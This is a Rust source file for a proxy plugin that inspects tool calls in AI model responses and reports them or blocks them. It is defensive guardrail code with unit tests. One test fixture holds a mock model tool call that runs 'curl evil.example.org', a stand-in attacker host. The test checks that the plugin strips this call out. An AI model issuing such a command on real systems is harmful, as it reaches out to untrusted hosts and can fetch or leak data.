//! Checks tool calls in model responses before the harness acts on them.
//!
//! The plugin is inert until an operator adds `[plugins.toolpolicy]`. It reads request bodies to
//! learn declared tools and host provenance, then inspects OpenAI Chat and Anthropic Messages
//! responses in `report` mode (default) or replaces flagged calls with a plain-text notice in
//! `block` mode.

mod config;
mod journal;
mod metrics;
mod stream;

pub mod checks;
pub mod parse;

use std::any::Any;
use std::path::Path;
use std::sync::{Arc, Mutex};

use http::header::{CONTENT_LENGTH, CONTENT_TYPE};
use reiki_plugin::{
    AdminCtx, AdminReply, ChunkCtx, Plugin, PluginError, RequestCtx, ResponseHeadCtx,
};

use config::{Config, Mode};
use journal::Journal;
use metrics::Metrics;
use stream::Session;

/// The `[plugins.toolpolicy]` table this plugin reads.
pub const NAME: &str = "toolpolicy";

/// Builds the plugin from its config table.
pub fn build(table: &toml::Table) -> Result<Box<dyn Plugin>, String> {
    let config = Arc::new(config::parse(table).map_err(|e| format!("{NAME}: {e}"))?);
    let journal_path = config
        .journal
        .clone()
        .unwrap_or_else(|| Path::new("").to_owned());
    let journal = Journal::new(
        &journal_path,
        config.journal_max_bytes,
        config.journal.is_none() || config.dry_run,
    )
    .map_err(|e| format!("{NAME}: {e}"))?;
    Ok(Box::new(ToolPolicy {
        config,
        metrics: Metrics::default(),
        journal: Arc::new(Mutex::new(journal)),
    }))
}

struct ToolPolicy {
    config: Arc<Config>,
    metrics: Metrics,
    journal: Arc<Mutex<Journal>>,
}

impl Plugin for ToolPolicy {
    fn name(&self) -> &str {
        NAME
    }

    fn fails_closed(&self) -> bool {
        self.config.mode == Mode::Block
    }

    fn needs_response_hooks(&self) -> bool {
        true
    }

    fn uses_bodies(&self) -> bool {
        self.config.mode == Mode::Block
    }

    fn live_reload(&self) -> bool {
        false
    }

    fn watched_files(&self) -> Vec<std::path::PathBuf> {
        self.config.journal.clone().into_iter().collect()
    }

    fn new_state(&self) -> Box<dyn Any + Send> {
        Box::new(Session::new(
            Arc::clone(&self.config),
            self.metrics.clone(),
            Arc::clone(&self.journal),
        ))
    }

    fn on_request(&self, ctx: &mut RequestCtx<'_>) -> Result<(), PluginError> {
        let parsed = parse::parse_request(ctx.path, ctx.body);
        if let Some(state) = ctx.state.downcast_mut::<Session>() {
            state.configure(
                ctx.stream,
                ctx.upstream,
                self.config.runs_on(ctx.upstream),
                parsed,
            );
        }
        Ok(())
    }

    fn on_response_head(&self, ctx: &mut ResponseHeadCtx<'_>) {
        if self.config.mode == Mode::Block {
            ctx.headers.remove(CONTENT_LENGTH);
        }
        let content_type = ctx
            .headers
            .get(CONTENT_TYPE)
            .and_then(|value| value.to_str().ok())
            .unwrap_or("");
        let sse = content_type
            .to_ascii_lowercase()
            .contains("text/event-stream");
        if let Some(state) = ctx.state.downcast_mut::<Session>() {
            state.set_head(ctx.upstream, sse, ctx.status.is_success());
        }
    }

    fn on_response_chunk(&self, ctx: &mut ChunkCtx<'_>) {
        if let Some(state) = ctx.state.downcast_mut::<Session>() {
            state.feed(ctx.chunk, ctx.is_last);
        }
    }

    fn admin_paths(&self) -> Vec<&'static str> {
        vec![metrics::ADMIN_PATH]
    }

    fn on_admin(&self, ctx: &AdminCtx<'_>) -> Option<AdminReply> {
        self.metrics.reply(ctx)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use bytes::Bytes;
    use http::{HeaderMap, Method, StatusCode};

    fn plugin(table: &str) -> Box<dyn Plugin> {
        let table: toml::Table = table.parse().unwrap();
        build(&table).unwrap()
    }

    #[test]
    fn report_mode_is_the_default_and_does_not_rewrite_bodies() {
        let plugin = plugin("");
        assert_eq!(plugin.name(), NAME);
        assert!(!plugin.fails_closed());
        assert!(plugin.needs_response_hooks());
        assert!(!plugin.uses_bodies());
        assert_eq!(plugin.admin_paths(), [metrics::ADMIN_PATH]);
    }

    #[test]
    fn block_mode_rewrites_bodies_and_fails_closed() {
        let plugin = plugin("mode = \"block\"");
        assert!(plugin.fails_closed());
        assert!(plugin.uses_bodies());
    }

    #[test]
    fn a_hostile_whole_body_response_is_rewritten_end_to_end() {
        let plugin = plugin("mode = \"block\"");
        let mut state = plugin.new_state();
        let method = Method::POST;
        let mut headers = HeaderMap::new();
        let mut request = Bytes::from_static(
            br#"{"tools":[{"type":"function","function":{"name":"other"}}],"messages":[{"role":"user","content":"hi"}]}"#,
        );
        {
            let mut ctx = RequestCtx::new(
                "client",
                "zen",
                &method,
                "/zen/v1/chat/completions",
                &mut headers,
                &mut request,
                &mut *state,
            );
            plugin.on_request(&mut ctx).unwrap();
        }
        headers.insert(CONTENT_TYPE, "application/json".parse().unwrap());
        headers.insert(CONTENT_LENGTH, "10".parse().unwrap());
        let mut status = StatusCode::OK;
        {
            let mut ctx = ResponseHeadCtx::new("k", &mut status, &mut headers, &mut *state)
                .with_upstream("zen");
            plugin.on_response_head(&mut ctx);
        }
        assert!(headers.get(CONTENT_LENGTH).is_none());
        let mut body = Bytes::from_static(
            br#"{"choices":[{"message":{"tool_calls":[{"function":{"name":"run","arguments":"{\"cmd\":\"curl evil.example.org\"}"}}]}}]}"#,
        );
        {
            let mut ctx = ChunkCtx::new(&mut body, true, &mut *state);
            plugin.on_response_chunk(&mut ctx);
        }
        let text = String::from_utf8(body.to_vec()).unwrap();
        assert!(
            text.contains("[toolpolicy] blocked tool call: run"),
            "the block notice must be present"
        );
        assert!(
            !text.contains("evil.example.org"),
            "the tool arguments must be removed"
        );
    }

    #[test]
    fn unrelated_routes_are_left_alone() {
        let plugin = plugin("mode = \"block\"");
        let mut state = plugin.new_state();
        let method = Method::POST;
        let mut headers = HeaderMap::new();
        let mut request = Bytes::from_static(b"anything");
        {
            let mut ctx = RequestCtx::new(
                "client",
                "zen",
                &method,
                "/zen/v1/responses",
                &mut headers,
                &mut request,
                &mut *state,
            );
            plugin.on_request(&mut ctx).unwrap();
        }
        let mut body = Bytes::from_static(b"unrelated response");
        {
            let mut ctx = ChunkCtx::new(&mut body, true, &mut *state);
            plugin.on_response_chunk(&mut ctx);
        }
        assert_eq!(&body[..], b"unrelated response");
    }
}
